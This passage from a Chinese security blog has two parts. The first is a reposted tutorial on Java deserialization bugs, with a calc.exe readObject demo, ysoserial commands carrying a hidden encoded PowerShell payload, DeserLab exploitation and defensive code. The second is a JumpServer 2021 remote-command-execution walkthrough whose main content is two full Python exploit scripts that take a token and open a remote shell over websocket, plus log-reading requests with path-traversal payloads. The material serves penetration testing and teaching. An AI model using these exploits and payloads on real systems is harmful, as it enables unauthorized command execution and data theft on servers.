c.printStackTrace(); return; } System.out.println(&quot;Deserialized Employee...&quot;); System.out.println(&quot;Name: &quot; + e.name); System.out.println(&quot;This is the &quot;+e.identify+&quot; of our company&quot;); }} 就这样，一个完整的序列化周期就完成了，其实实际应用中的序列化无非就是传输的方式和传输机制稍微复杂一点，和这个demo没有太大区别。 PS:try和catch是异常处理机制，和序列化操作没有直接关系。如果想要深入学习Java编程，建议购买一本《Java疯狂讲义》，还有金旭亮老师的Java学习PPT（力荐） 简单的反序列化漏洞demo在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。 PS：有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。 123456789101112131415161718192021222324252627//反序列化所需类在io包中import java.io.*;public class test{ public static void main(String args[]) throws Exception{ UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = &quot;hacked by ph0rse&quot;; FileOutputStream fos = new FileOutputStream(&quot;object&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将Unsafe对象写入object文件 os.writeObject(Unsafe); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(&quot;object&quot;); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); }}class UnsafeClass implements Serializable{ public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(&quot;calc.exe&quot;); }} 程序运行逻辑为： UnsafeClass类被序列化进object文件 从object文件中恢复对象 调用被恢复对象的readObject方法 命令执行 反序列化漏洞起源开发失误之前的demo就是一个对反序列化完全没有进行安全审查的示例，但实战中不会有程序员会写出这种弱智代码。因此开发时产生的反序列化漏洞常见的有以下几种情况： 重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。 使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。 基础库中隐藏的反序列化漏洞优秀的Java开发人员一般会按照安全编程规范进行编程，很大程度上减少了反序列化漏洞的产生。并且一些成熟的Java框架比如Spring MVC、Struts2等，都有相应的防范反序列化的机制。如果仅仅是开发失误，可能很少会产生反序列化漏洞，即使产生，其绕过方法、利用方式也较为复杂。但其实，有很大比例的反序列化漏洞是因使用了不安全的基础库而产生的。2015年由黑客Gabriel Lawrence和Chris Frohoff发现的‘Apache Commons Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。存在危险的基础库： 123456789101112commons-fileupload 1.3.1commons-io 2.4commons-collections 3.1commons-logging 1.2commons-beanutils 1.9.2org.slf4j:slf4j-api 1.7.21com.mchange:mchange-commons-java 0.2.11org.apache.commons:commons-collections 4.0com.mchange:c3p0 0.9.5.2org.beanshell:bsh 2.0b5org.codehaus.groovy:groovy 2.3.9org.springframework:spring-aop 4.1.4.RELEASE 某反序列化防护软件便是通过禁用以下类的反序列化来保护程序： 12345678'org.apache.commons.collections.functors.InvokerTransformer','org.apache.commons.collections.functors.InstantiateTransformer','org.apache.commons.collections4.functors.InvokerTransformer','org.apache.commons.collections4.functors.InstantiateTransformer','org.codehaus.groovy.runtime.ConvertedClosure','org.codehaus.groovy.runtime.MethodClosure','org.springframework.beans.factory.ObjectFactory','xalan.internal.xsltc.trax.TemplatesImpl' 基础库中的调用流程一般都比较复杂，比如org.apache.commons.collections.functors.InvokerTransformer的POP链就涉及反射、泛型等，而网上也有很多复现跟踪流程的文章，比如前些天先知发布的这两篇。Java反序列化漏洞-玄铁重剑之CommonsCollection(上)Java反序列化漏洞-玄铁重剑之CommonsCollection(下)这里就不再赘述了，可以跟着ysoserial的EXP去源码中一步步跟进、调试。 POP Gadgets这里介绍一个概念，POP Gadgets指的是在通过带入序列化数据，经过一系列调用的代码链，其中POP指的是Property-Oriented Programming，即面向属性编程，和逆向那边的ROP很相似，面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。两者的不同之处在于ROP更关注底层，而POP只关注对象与对象之间的调用关系。Gadgets是小工具的意思，POP Gadgets即为面向属性编程的利用工具、利用链。当我们确定了可以带入序列化数据的入口后，便是要寻找对应的POP链。以上提到的基础库和框架恰恰提供了可导致命令执行 POP 链的环境，所以引入了用户可控的序列化数据，并使用了不安全的基本库，就意味着存在反序列化漏洞。随着对反序列化漏洞的深入，我们会慢慢意识到很难将不安全的基本库这一历史遗留问题完全清楚，所以清楚漏洞的根源还是在不可信的输入和未检测反序列化对象安全性。 基本库中的反序列化触发机制较为复杂和底层，可以结合ysoserial源码中的exp来进行跟进分析。 本文后期会进行详细讲解。 如何发现Java反序列化漏洞白盒检测当持有程序源码时，可以采用这种方法，逆向寻找漏洞。 反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。 流程如下： ① 通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点可以搜索以下函数： 1234567ObjectInputStream.readObjectObjectInputStream.readUnsharedXMLDecoder.readObjectYaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject 小数点前面是类名，后面是方法名 ② 确定了反序列化输入点后，再考察应用的Class Path中是否包含Apache Commons Collections等危险库（ysoserial所支持的其他库亦可）。 ③ 若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。 ④ 若包含危险库，则使用ysoserial进行攻击复现。 黑盒检测在黑盒测试中并不清楚对方的代码架构，但仍然可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache Commons Collection）的调用地点，并进行数据替换，从而实现利用。在实战过程中，我们可以通过抓包来检测请求中可能存在的序列化数据。序列化数据通常以AC ED开始，之后的两个字节是版本号，版本号一般是00 05但在某些情况下可能是更高的数字。为了理解反序列化数据样式，我们使用以下代码举例： 12345678910111213141516171819202122232425import java.io.*;public class SerializeDemo{ public static void main(String [] args) { Employee e = new Employee(); e.name = &quot;员工甲&quot;; e.identify = &quot;General staff&quot;; try { // 打开一个文件输入流 FileOutputStream fileOut = new FileOutputStream(&quot;D:\\\\Task\\\\employee1.db&quot;); // 建立对象输入流 ObjectOutputStream out = new ObjectOutputStream(fileOut); //输出反序列化对象 out.writeObject(e); out.close(); fileOut.close(); System.out.printf(&quot;Serialized data is saved in D:\\\\Task\\\\employee1.db&quot;); }catch(IOException i) { i.printStackTrace(); } }} 在本地环境下运行一下，即可看到生成的employee1.db文件。生成的employee1.db反序列化数据为（可用Winhex、Sublime等工具打开）： 需要注意的是，AC ED 00 05是常见的序列化数据开始，但有些应用程序在整个运行周期中保持与服务器的网络连接，如果攻击载荷是在延迟中发送的，那检测这四个字节就是无效的。所以有些防火墙工具在检测反序列化数据时仅仅检测这几个字节是不安全的设置。 所以我们也要对序列化转储过程中出现的Java类名称进行检测，Java类名称可能会以“L”开头的替代格式出现 ，以’;’结尾 ，并使用正斜杠来分隔命名空间和类名（例如 “Ljava / rmi / dgc / VMID;”）。除了Java类名，由于序列化格式规范的约定，还有一些其他常见的字符串，例如 ：表示对象（TC_OBJECT），后跟其类描述（TC_CLASSDESC）的’sr’或 可能表示没有超类（TC_NULL）的类的类注释（TC_ENDBLOCKDATA）的’xp’。 识别出序列化数据后，就要定位插入点，不同的数据类型有以下的十六进制对照表： 12345678910110x70 - TC_NULL0x71 - TC_REFERENCE0x72 - TC_CLASSDESC0x73 - TC_OBJECT0x74 - TC_STRING0x75 - TC_ARRAY0x76 - TC_CLASS0x7B - TC_EXCEPTION0x7C - TC_LONGSTRING0x7D - TC_PROXYCLASSDESC0x7E - TC_ENUM AC ED 00 05之后可能跟上述的数据类型说明符，也可能跟77(TC_BLOCKDATA元素)或7A(TC_BLOCKDATALONG元素)其后跟的是块数据。 序列化数据信息是将对象信息按照一定规则组成的，那我们根据这个规则也可以逆向推测出数据信息中的数据类型等信息。并且有大牛写好了现成的工具-SerializationDumper 用法：java -jar SerializationDumper-v1.0.jar aced000573720008456d706c6f796565eae11e5afcd287c50200024c00086964656e746966797400124c6a6176612f6c616e672f537472696e673b4c00046e616d6571007e0001787074000d47656e6572616c207374616666740009e59198e5b7a5e794b2 后面跟的十六进制字符串即为序列化后的数据 工具自动解析出包含的数据类型之后，就可以替换掉TC_BLOCKDATE进行替换了。AC ED 00 05经过Base64编码之后为rO0AB 在实战过程中，我们可以通过tcpdump抓取TCP/HTTP请求，通过SerialBrute.py去自动化检测，并插入ysoserial生成的exp 12SerialBrute.py -r &lt;file&gt; -c &lt;command&gt; [opts]``SerialBrute.py -p &lt;file&gt; -t &lt;host:port&gt; -c &lt;command&gt; [opts] 使用ysoserial.jar访问请求记录判断反序列化漏洞是否利用成功：java -jar ysoserial.jar CommonsCollections1 'curl &quot; + URL + &quot; ' 当怀疑某个web应用存在Java反序列化漏洞，可以通过以上方法扫描并爆破攻击其RMI或JMX端口（默认1099）。 环境测试在这里，我们使用大牛写好的DeserLab来模拟实战环境。 DeserLab演示DeserLab是一个使用了Groovy库的简单网络协议应用，实现client向server端发送序列化数据的功能。而Groovy库和上文中的Apache Commons Collection库一样，含有可利用的POP链。我们可以使用上文提到的ysoserial和在线载荷生成器进行模拟利用。复现环境： win10 python2.7 java1.8 首先生成有效载荷,由于是在windows环境下，所以使用powershell作为攻击载体。 用ysoserial生成针对Groovy库的payloadjava -jar ysoserial.jar Groovy1 &quot;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc bQBrAGQAaQByACAAaABhAGMAawBlAGQAXwBiAHkAXwBwAGgA MAByAHMAZQA=&quot; &gt; payload2.bin 在DeserLab的Github项目页面下载DeserLab.jar命令行下使用java -jar DeserLab.jar -server 127.0.0.1 6666开启本地服务端。 使用deserlab_exploit.py脚本【上传到自己的github gist页面上】生成payload：python deserlab_exploit.py 127.0.0.1 6666 payload2.bin PS:注意使用py2.7 成功写入： 即可执行任意命令 反序列化修复每一名Java程序员都应当掌握防范反序列化漏洞的编程技巧、以及如何降低危险库对应用造成的危害。 对于危险基础类的调用下载这个jar后放置于classpath，将应用代码中的java.io.ObjectInputStream替换为SerialKiller，之后配置让其能够允许或禁用一些存在问题的类，SerialKiller有Hot-Reload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型。 通过Hook resolveClass来校验反序列化的类在使用readObject()反序列化时首先会调用resolveClass方法读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。具体实现代码Demo如下: 123456789101112131415161718public class AntObjectInputStream extends ObjectInputStream{ public AntObjectInputStream(InputStream inputStream) throws IOException { super(inputStream); } /** * 只允许反序列化SerialObject class */ @Override protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { if (!desc.getName().equals(SerialObject.class.getName())) { throw new InvalidClassException( &quot;Unauthorized deserialization attempt&quot;, desc.getName()); } return super.resolveClass(desc); }} 通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。 12345678910org.apache.commons.collections.functors.InvokerTransformerorg.apache.commons.collections.functors.InstantiateTransformerorg.apache.commons.collections4.functors.InvokerTransformerorg.apache.commons.collections4.functors.InstantiateTransformerorg.codehaus.groovy.runtime.ConvertedClosureorg.codehaus.groovy.runtime.MethodClosureorg.springframework.beans.factory.ObjectFactorycom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplorg.apache.commons.fileuploadorg.apache.commons.beanutils 根据以上方法，有大牛实现了线程的SerialKiller包可供使用。 使用ValidatingObjectInputStream来校验反序列化的类使用Apache Commons IO Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白/黑名单控制，具体可参考ValidatingObjectInputStream介绍；示例代码如下: 12345678910private static Object deserialize(byte[] buffer) throws IOException,ClassNotFoundException , ConfigurationException { Object obj; ByteArrayInputStream bais = new ByteArrayInputStream(buffer); // Use ValidatingObjectInputStream instead of InputStream ValidatingObjectInputStream ois = new ValidatingObjectInputStream(bais); //只允许反序列化SerialObject class ois.accept(SerialObject.class); obj = ois.readObject(); return obj;} 使用contrast-rO0防御反序列化攻击contrast-rO0是一个轻量级的agent程序，通过通过重写ObjectInputStream来防御反序列化漏洞攻击。使用其中的SafeObjectInputStream类来实现反序列化类白/黑名单控制，示例代码如下: 12SafeObjectInputStream in = new SafeObjectInputStream(inputStream, true);in.addToWhitelist(SerialObject.class);in.readObject(); 使用ObjectInputFilter来校验反序列化的类Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承java.io.ObjectInputFilter类重写checkInput方法实现自定义的过滤器，，并使用ObjectInputStream对象的setObjectInputFilter设置过滤器来实现反序列化类白/黑名单控制。示例代码如下: 12345678910111213141516171819202122232425import java.util.List;import java.util.Optional;import java.util.function.Function;import java.io.ObjectInputFilter;class BikeFilter implements ObjectInputFilter { private long maxStreamBytes = 78; // Maximum allowed bytes in the stream. private long maxDepth = 1; // Maximum depth of the graph allowed. private long maxReferences = 1; // Maximum number of references in a graph. @Override public Status checkInput(FilterInfo filterInfo) { if (filterInfo.references() &lt; 0 || filterInfo.depth() &lt; 0 || filterInfo.streamBytes() &lt; 0 || filterInfo.references() &gt; maxReferences || filterInfo.depth() &gt; maxDepth|| filterInfo.streamBytes() &gt; maxStreamBytes) { return Status.REJECTED; } Class&lt;?&gt; clazz = filterInfo.serialClass(); if (clazz != null) { if (SerialObject.class == filterInfo.serialClass()) { return Status.ALLOWED; } else { return Status.REJECTED; } } return Status.UNDECIDED; } // end checkInput} // end class BikeFilter 上述示例代码，仅允许反序列化SerialObject类对象。 禁止JVM执行外部命令Runtime.exec通过扩展SecurityManager 12345678910111213141516171819202122232425262728SecurityManager originalSecurityManager = System.getSecurityManager(); if (originalSecurityManager == null) { // 创建自己的SecurityManager SecurityManager sm = new SecurityManager() { private void check(Permission perm) { // 禁止exec if (perm instanceof java.io.FilePermission) { String actions = perm.getActions(); if (actions != null &amp;&amp; actions.contains(&quot;execute&quot;)) { throw new SecurityException(&quot;execute denied!&quot;); } } // 禁止设置新的SecurityManager，保护自己 if (perm instanceof java.lang.RuntimePermission) { String name = perm.getName(); if (name != null &amp;&amp; name.contains(&quot;setSecurityManager&quot;)) { throw new SecurityException(&quot;System.setSecurityManager denied!&quot;); } } } @Override public void checkPermission(Permission perm) { check(perm); } @Override public void checkPermission(Permission perm, Object context) { check(perm); } }; System.setSecurityManager(sm); } 不建议使用的黑名单在反序列化时设置类的黑名单来防御反序列化漏洞利用及攻击，这个做法在源代码修复的时候并不是推荐的方法，因为你不能保证能覆盖所有可能的类，而且有新的利用payload出来时也需要随之更新黑名单，但有一种场景下可能黑名单是一个不错的选择。写代码的时候总会把一些经常用到的方法封装到公共类，这样其它工程中用到只需要导入jar包即可，此前已经见到很多提供反序列化操作的公共接口，使用第三方库反序列化接口就不好用白名单的方式来修复了。这个时候作为第三方库也不知道谁会调用接口，会反序列化什么类，所以这个时候可以使用黑名单的方式来禁止一些已知危险的类被反序列化，具体的黑名单类可参考contrast-rO0、ysoserial中paylaod包含的类。 总结感觉在实战中遇到的Java站点越来越多，Java反序列化漏洞的利用也愈发显得重要。除了常见的Web服务反序列化，安卓、桌面应用、中间件、工控组件等等的反序列化。以及XML（前一阵的Weblogic挖矿事件就是XMLDecoder引起的Java反序列化）、JSON、RMI等细致化的分类。代码审计及渗透测试过程中可以翻阅我翻译的一份Java反序列化漏洞备忘单，里面集合了目前关于Java反序列化研究的大会PPT、PDF文档、测试代码，以及权威组织发布的漏洞研究报告，还有被反序列化攻破的应用清单（附带POC）。这着实是一个庞大的知识体系，笔者目前功力较浅，希望日后还能和各位师傅一起讨论、学习。 转载自：https://xz.aliyun.com/t/2041","link":"/2020/09/20/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/"},{"title":"JumpServer 远程命令执行-2021","text":"简介JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。JumpServer 使用Python / Django 进行开发。 组件介绍： Jumpserver 现指 Jumpserver 管理后台，是核心组件（Core）, 使用 Django Class Based View 风格开发，支持 Restful API。 Coco 实现了 SSH Server 和 Web Terminal Server 的组件，提供 SSH 和 WebSocket 接口, 使用 Paramiko 和 Flask 开发。 Luna 现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。 Guacamole Apache 跳板机项目，Jumpserver 使用其组件实现 RDP 功能，Jumpserver 并没有修改其代码而是添加了额外的插件，支持 Jumpserver 调用 漏洞概述2021年1月15日，JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，或者执行相关API操作控制其中所有机器，执行任意命令。建议相关用户尽快采取措施阻止漏洞攻击。 利用流程1.通过ws连接jumpserver的未授权api，进行日志读取 获取三个id值 (system_id,target_id,system_user_id) 2.利用 /api/v1/authentication/connection-token/?user-only=1 获取token （此token 20s内有效） 3.通过ws 连接 /koko/ws/token/?target_id 带入刚刚获取的token_id 进行执行命令 影响版本JumpServer &lt; v2.6.2JumpServer &lt; v2.5.4JumpServer &lt; v2.4.5JumpServer = v1.5.9 环境搭建安装JumpServer v2.6.1安装脚本https://www.o2oxy.cn/wp-content/uploads/2021/01/quick_start.zip 要求Centos 7 系统，内存8G以上，cpu 2核以上 或者执行官网脚本 curl -sSL https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh | bash 解压缩后执行 1./quick_start.sh 默认即可(不引用外部redis,mysql) 进入/opt/jumpserver-installer-v2.6.2，执行 1./jmsctl.sh start 如下图为执行正常 降级到v2.6.1，执行 1./jmsctl.sh upgrade v2.6.1 其他命令： 1234./jmsctl.sh stop./jmsctl.sh restart./jmsctl.sh backup./jmsctl.sh upgrade web后台 12http://127.0.0.1:8080https://127.0.0.1:8443 ssh/sftp访问 12ssh admin@127.0.0.1 -p2222sftp -P2222 admin@127.0.0.1 相关资料： https://docs.jumpserver.org https://www.jumpserver.org 访问web端http://127.0.0.1:8080 admin/admin 先随便创建一台同网段的Linux虚拟机192.168.132.131，然后添加到资产列表中，通过web端访问后才能获取三个id值 创建系统用户 更新管理用户 资产列表添加主机 资产授权 打开web终端 脚本复现脚本11、运行脚本获取到asset、system_user、user三个ID值 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import osimport asyncioimport aioconsoleimport websocketsimport requestsimport json url = &quot;/api/v1/authentication/connection-token/?user-only=1&quot; # def get_celery_task_log_path(task_id):# task_id = str(task_id)# rel_path = os.path.join(task_id[0], task_id[1], task_id + &quot;.log&quot;)# path = os.path.join(&quot;/opt/jumpserver/&quot;, rel_path)# return pathasync def send_msg(websocket, _text): if _text == &quot;exit&quot;: print(f'you have enter &quot;exit&quot;, goodbye') await websocket.close(reason=&quot;user exit&quot;) return False await websocket.send(_text) async def send_loop(ws, session_id): while True: cmdline = await aioconsole.ainput() await send_msg( ws, json.dumps( {&quot;id&quot;: session_id, &quot;type&quot;: &quot;TERMINAL_DATA&quot;, &quot;data&quot;: cmdline + &quot;\\n&quot;} ), ) async def recv_loop(ws): while True: recv_text = await ws.recv() ret = json.loads(recv_text) if ret.get(&quot;type&quot;, &quot;TERMINAL_DATA&quot;): await aioconsole.aprint(ret[&quot;data&quot;], end=&quot;&quot;) # 客户端主逻辑async def main_logic(): print(&quot;#######start ws&quot;) async with websockets.connect(target) as client: recv_text = await client.recv() print(f&quot;{recv_text}&quot;) session_id = json.loads(recv_text)[&quot;id&quot;] print(&quot;get ws id:&quot; + session_id) print(&quot;###############&quot;) print(&quot;init ws&quot;) print(&quot;###############&quot;) inittext = json.dumps( { &quot;id&quot;: session_id, &quot;type&quot;: &quot;TERMINAL_INIT&quot;, &quot;data&quot;: '{&quot;cols&quot;:164,&quot;rows&quot;:17}', } ) await send_msg(client, inittext) await asyncio.gather(recv_loop(client), send_loop(client, session_id)) if __name__ == &quot;__main__&quot;: host = &quot;http://192.168.132.130:8080&quot; cmd = &quot;whoami&quot; if host[-1] == &quot;/&quot;: host = host[:-1] print(host) data = {&quot;user&quot;: &quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;, &quot;asset&quot;: &quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;, &quot;system_user&quot;: &quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;} print(&quot;##################&quot;) print(&quot;get token url:%s&quot; % (host + url,)) print(&quot;##################&quot;) res = requests.post(host + url, json=data) token = res.json()[&quot;token&quot;] print(&quot;token:%s&quot; % (token,)) print(&quot;##################&quot;) target = ( &quot;ws://&quot; + host.replace(&quot;http://&quot;, &quot;&quot;) + &quot;/koko/ws/token/?target_id=&quot; + token ) print(&quot;target ws:%s&quot; % (target,)) asyncio.get_event_loop().run_until_complete(main_logic()) 1GET /api/v1/perms/asset-permissions/user/validate/?action_name=connect&amp;asset_id=90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy=1&amp;system_user_id=8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id=61ec790f-b47b-4cb5-b598-548a559ba44e 2、将asset，system_user，user三个ID值放入下面脚本，Getshell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import osimport asyncioimport aioconsoleimport websocketsimport requestsimport json url = &quot;/api/v1/authentication/connection-token/?user-only=1&quot; def get_celery_task_log_path(task_id): task_id = str(task_id) rel_path = os.path.join(task_id[0], task_id[1], task_id + &quot;.log&quot;) path = os.path.join(&quot;/opt/jumpserver/&quot;, rel_path) return path async def send_msg(websocket, _text): if _text == &quot;exit&quot;: print(f'you have enter &quot;exit&quot;, goodbye') await websocket.close(reason=&quot;user exit&quot;) return False await websocket.send(_text) async def send_loop(ws, session_id): while True: cmdline = await aioconsole.ainput() await send_msg( ws, json.dumps( {&quot;id&quot;: session_id, &quot;type&quot;: &quot;TERMINAL_DATA&quot;, &quot;data&quot;: cmdline + &quot;\\n&quot;} ), ) async def recv_loop(ws): while True: recv_text = await ws.recv() ret = json.loads(recv_text) if ret.get(&quot;type&quot;, &quot;TERMINAL_DATA&quot;): await aioconsole.aprint(ret[&quot;data&quot;], end=&quot;&quot;) # 客户端主逻辑async def main_logic(): print(&quot;#######start ws&quot;) async with websockets.connect(target) as client: recv_text = await client.recv() print(f&quot;{recv_text}&quot;) session_id = json.loads(recv_text)[&quot;id&quot;] print(&quot;get ws id:&quot; + session_id) print(&quot;###############&quot;) print(&quot;init ws&quot;) print(&quot;###############&quot;) inittext = json.dumps( { &quot;id&quot;: session_id, &quot;type&quot;: &quot;TERMINAL_INIT&quot;, &quot;data&quot;: '{&quot;cols&quot;:164,&quot;rows&quot;:17}', } ) await send_msg(client, inittext) await asyncio.gather(recv_loop(client), send_loop(client, session_id)) if __name__ == &quot;__main__&quot;: host = &quot;http://192.168.132.130:8080&quot; cmd = &quot;whoami&quot; if host[-1] == &quot;/&quot;: host = host[:-1] print(host) data = {&quot;user&quot;: &quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;, &quot;asset&quot;: &quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;, &quot;system_user&quot;: &quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;} print(&quot;##################&quot;) print(&quot;get token url:%s&quot; % (host + url,)) print(&quot;##################&quot;) res = requests.post(host + url, json=data) token = res.json()[&quot;token&quot;] print(&quot;token:%s&quot;, (token,)) print(&quot;##################&quot;) target = ( &quot;ws://&quot; + host.replace(&quot;http://&quot;, &quot;&quot;) + &quot;/koko/ws/token/?target_id=&quot; + token ) print(&quot;target ws:%s&quot; % (target,)) asyncio.get_event_loop().run_until_complete(main_logic()) 成功连接到某一台资产192.168.132.131 脚本2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163# -*- coding: utf-8 -*-# import requests# import json# data={&quot;user&quot;:&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;,&quot;asset&quot;:&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;,&quot;system_user&quot;:&quot;79655e4e-1741-46af-a793-fff394540a52&quot;}## url_host='http://192.168.1.73:8080'## def get_token():# url = url_host+'/api/v1/users/connection-token/?user-only=1'# url =url_host+'/api/v1/authentication/connection-token/?user-only=1'# response = requests.post(url, json=data).json()# print(response)# ret=requests.get(url_host+'/api/v1/authentication/connection-token/?token=%s'%response['token'])# print(ret.text)# get_token()import asyncioimport websocketsimport requestsimport jsonurl = &quot;/api/v1/authentication/connection-token/?user-only=None&quot;# 向服务器端发送认证后的消息async def send_msg(websocket,_text):if _text == &quot;exit&quot;:print(f'you have enter &quot;exit&quot;, goodbye')await websocket.close(reason=&quot;user exit&quot;)return Falseawait websocket.send(_text)recv_text = await websocket.recv()print(f&quot;{recv_text}&quot;)# 客户端主逻辑async def main_logic(cmd):print(&quot;#######start ws&quot;)async with websockets.connect(target) as websocket:recv_text = await websocket.recv()print(f&quot;{recv_text}&quot;)resws=json.loads(recv_text)id = resws['id']print(&quot;get ws id:&quot;+id)print(&quot;###############&quot;)print(&quot;init ws&quot;)print(&quot;###############&quot;)inittext = json.dumps({&quot;id&quot;: id, &quot;type&quot;: &quot;TERMINAL_INIT&quot;, &quot;data&quot;: &quot;{\\&quot;cols\\&quot;:164,\\&quot;rows\\&quot;:17}&quot;})await send_msg(websocket,inittext)for i in range(20):recv_text = await websocket.recv()print(f&quot;{recv_text}&quot;)print(&quot;###############&quot;)print(&quot;exec cmd: ls&quot;)cmdtext = json.dumps({&quot;id&quot;: id, &quot;type&quot;: &quot;TERMINAL_DATA&quot;, &quot;data&quot;: cmd+&quot;\\r\\n&quot;})print(cmdtext)await send_msg(websocket, cmdtext)for i in range(20):recv_text = await websocket.recv()print(f&quot;{recv_text}&quot;)print('#######finish')if __name__ == '__main__':try:import syshost=sys.argv[1]cmd=sys.argv[2]if host[-1]=='/':host=host[:-1]print(host)data = {&quot;user&quot;: &quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;, &quot;asset&quot;: &quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;,&quot;system_user&quot;: &quot;79655e4e-1741-46af-a793-fff394540a52&quot;}print(&quot;##################&quot;)print(&quot;get token url:%s&quot; % (host + url,))print(&quot;##################&quot;)res = requests.post(host + url, json=data)token = res.json()[&quot;token&quot;]print(&quot;token:%s&quot;, (token,))print(&quot;##################&quot;)target = &quot;ws://&quot; + host.replace(&quot;http://&quot;, '') + &quot;/koko/ws/token/?target_id=&quot; + tokenprint(&quot;target ws:%s&quot; % (target,))asyncio.get_event_loop().run_until_complete(main_logic(cmd))except:print(&quot;python jumpserver.py http://192.168.1.73 whoami&quot;) 手工复现插件下载： https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related 插件验证websocket未授权url：ws://192.168.132.130:8080/ws/ops/tasks/log/ Request：{&quot;task&quot;:&quot;/opt/jumpserver/logs/jumpserver&quot;} 查看Task id的一些信息（看不到密码） 获取到Task id为d4025be3-c3b6-49ca-87c6-97472450f08f Request：{&quot;task&quot;:&quot;d4025be3-c3b6-49ca-87c6-97472450f08f&quot;} 123{&quot;task&quot;:&quot;d4025be3-c3b6-49ca-87c6-97472450f08f&quot;}{&quot;message&quot;: &quot;\\r\\n&quot;}{&quot;message&quot;: &quot;2021-01-25 16:40:03 \\u4efb\\u52a1\\u5f00\\u59cb: \\u6d4b\\u8bd5\\u8d44\\u4ea7\\u53ef\\u8fde\\u63a5\\u6027: test(192.168.132.131)\\r\\r\\nPLAY [\\u6d4b\\u8bd5\\u8d44\\u4ea7\\u53ef\\u8fde\\u63a5\\u6027: test(192.168.132.131)] *****************************************\\r\\r\\nTASK [ping] ********************************************************************\\r\\r\\n\\u001b[0;32mok: [test]\\u001b[0m\\r\\r\\n2021-01-25 16:40:15 \\u4efb\\u52a1\\u7ed3\\u675f\\r\\r\\n.\\r\\n\\r\\n.\\r\\r\\nTask assets.tasks.asset_connectivity.test_asset_connectivity_manual[d4025be3-c3b6-49ca-87c6-97472450f08f] succeeded in 13.248451138999826s: (True, '')\\r\\r\\n&quot;, &quot;task&quot;: &quot;d4025be3-c3b6-49ca-87c6-97472450f08f&quot;} 验证未授权存在。 获取 asset_id,system_user_id,user_id12ws://10.91.198.20:8989/ws/ops/tasks/log/{&quot;task&quot;:&quot;/opt/jumpserver/logs/gunicorn&quot;} or {&quot;task&quot;:&quot;/../../../../../../../../../../../..//opt/jumpserver/logs/gunicorn&quot;} 得到 1&quot;system_user&quot;: &quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;, &quot;user&quot;: 